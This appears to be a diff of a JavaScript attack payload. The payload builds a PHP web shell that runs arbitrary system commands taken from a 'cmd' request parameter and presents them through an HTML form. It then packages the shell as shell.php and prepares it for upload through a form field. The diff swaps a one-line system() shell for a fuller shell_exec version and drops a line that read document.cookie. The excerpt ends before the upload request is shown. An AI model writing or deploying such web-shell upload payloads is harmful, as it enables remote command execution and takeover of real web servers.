@@ -1,11 +1,22 @@
 alert("Payload loaded");
 (async () => {
-  const cookie = document.cookie;
+  const shell = `
+  <?php
+  if (isset($_GET['cmd'])) {
+    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+    exit;
+  }
+  ?>
+  <html>
+  <body>
+  <form method="GET">
+    <input name="cmd" style="width:70%;">
+    <input type="submit" value="Execute">
+  </form>
+  </body>
+  </html>`;
 
-  // Basic PHP shell payload
-  const content = `<?php if(isset($_REQUEST['cmd'])){echo "<pre>"; system($_REQUEST['cmd']); echo "</pre>";} ?>`;
-
-  const file = new File([content], "shell.php", { type: "application/x-php" });
+  const file = new File([shell], "shell.php", { type: "application/x-php" });
 
   const form = new FormData();
   form.append("localfile", file);
